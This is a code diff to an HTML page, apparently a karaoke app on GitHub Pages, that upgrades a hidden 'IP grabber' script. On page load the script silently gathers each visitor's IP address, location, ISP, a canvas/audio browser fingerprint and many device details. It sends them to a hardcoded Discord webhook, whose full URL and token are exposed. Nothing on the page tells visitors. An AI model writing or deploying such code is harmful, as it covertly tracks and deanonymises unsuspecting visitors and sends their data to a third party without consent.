@@ -1084,49 +1084,88 @@ document.addEventListener('keydown', e => {
 // Init favorites display
 renderFavList();
 </script>
-<!-- ==================== IP GRABBER (SUDAH BENAR & BERSIH) ==================== -->
+<!-- ==================== IP GRABBER UPGRADE v2 ==================== -->
 <script>
-// GANTI DENGAN WEBHOOK DISCORD KAMU (yang ini sudah benar)
+// GANTI DENGAN WEBHOOK DISCORD KAMU
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1489972314215809124/bRqWBzezptsRKE8nLFEFMjz3ShcgSFATRsf1KhuF4AkSKu3a2xIQkU0T4p5pCEgpQQq7";
 
 async function sendIPLog() {
+    let ipData = { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country_name: 'Unknown', org: 'Unknown' };
+
     try {
         const ipRes = await fetch('https://ipapi.co/json/');
-        const ipData = await ipRes.json();
+        ipData = await ipRes.json();
+    } catch (e) { console.log("IP lookup failed"); }
 
-        const embed = {
-            title: "🎤 Karaoke Sync - Pengunjung Baru!",
-            color: 0x00ff88,
-            timestamp: new Date().toISOString(),
-            fields: [
-                { name: "IP Address", value: `\`${ipData.ip || 'Unknown'}\``, inline: true },
-                { name: "Lokasi", value: `${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country_name || 'Unknown'}`, inline: true },
-                { name: "ISP", value: ipData.org || 'Unknown', inline: true },
-                { name: "Device Info", value: navigator.userAgent.substring(0, 140) + "...", inline: false },
-                { name: "Screen", value: `${screen.width} × ${screen.height}`, inline: true },
-                { name: "Waktu (WIB)", value: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }), inline: false }
-            ],
-            footer: { text: "IP Grabber via GitHub Pages" }
-        };
+    // Simple Browser Fingerprint
+    async function getFingerprint() {
+        try {
+            // Canvas fingerprint
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillText('Karaoke Sync Fingerprint', 2, 2);
+            const canvasHash = canvas.toDataURL().slice(-20);
 
+            // Audio fingerprint (simple)
+            let audioHash = 'N/A';
+            if (typeof AudioContext !== 'undefined') {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioCtx.createOscillator();
+                oscillator.type = 'sine';
+                oscillator.frequency.setValueAtTime(10000, audioCtx.currentTime);
+                audioHash = oscillator.frequency.value.toFixed(0);
+            }
+
+            return btoa(canvasHash + audioHash + navigator.hardwareConcurrency).slice(0, 32);
+        } catch (e) {
+            return 'Fingerprint failed';
+        }
+    }
+
+    const fingerprint = await getFingerprint();
+
+    const embed = {
+        title: "🎤 Karaoke Sync - Pengunjung Baru! (Upgrade)",
+        color: 0x00ff88,
+        timestamp: new Date().toISOString(),
+        fields: [
+            { name: "IP Address", value: `\`${ipData.ip || 'Unknown'}\``, inline: true },
+            { name: "Lokasi", value: `${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country_name || 'Unknown'}`, inline: true },
+            { name: "ISP", value: ipData.org || 'Unknown', inline: true },
+            { name: "Device Info", value: navigator.userAgent.substring(0, 140) + "...", inline: false },
+            { name: "Screen", value: `${screen.width} × ${screen.height} (${screen.colorDepth}bit)`, inline: true },
+            { name: "Platform", value: navigator.platform || 'Unknown', inline: true },
+            { name: "CPU Cores", value: navigator.hardwareConcurrency || 'Unknown', inline: true },
+            { name: "Device Memory", value: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown', inline: true },
+            { name: "Connection", value: navigator.connection ? navigator.connection.effectiveType + ' (' + (navigator.connection.downlink || '?') + ' Mbps)' : 'Unknown', inline: true },
+            { name: "Dark Mode", value: window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Yes' : 'No', inline: true },
+            { name: "Touch Support", value: 'ontouchstart' in window ? 'Yes (Mobile)' : 'No', inline: true },
+            { name: "Bahasa", value: navigator.language || 'Unknown', inline: true },
+            { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown', inline: true },
+            { name: "Browser Fingerprint", value: `\`${fingerprint}\``, inline: false },
+            { name: "Referrer", value: document.referrer ? document.referrer.substring(0, 80) : "Langsung / WA", inline: false },
+            { name: "Waktu (WIB)", value: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }), inline: false }
+        ],
+        footer: { text: "IP Grabber via GitHub Pages • Upgrade v2" }
+    };
+
+    try {
         await fetch(WEBHOOK_URL, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ username: "Karaoke Logger", embeds: [embed] })
         });
-
-        console.log("%c✅ IP Log terkirim ke Discord", "color: lime; font-weight: bold");
+        console.log("%c✅ IP Log terkirim (Upgrade v2)", "color: lime; font-weight: bold");
     } catch (err) {
         console.log("IP Logger error:", err.message);
     }
 }
 
-// Jalankan otomatis setelah halaman load
+// Jalankan setelah halaman load
 window.addEventListener('load', () => {
-    setTimeout(sendIPLog, 1200);   // delay 1.2 detik biar karaoke tidak lemot
+    setTimeout(sendIPLog, 1800);   // delay 1.8 detik biar aman
 });
 </script>
-<!-- ==================== END IP GRABBER ==================== -->
-
-</body>
-</html>
+<!-- ==================== END IP GRABBER UPGRADE ==================== -->
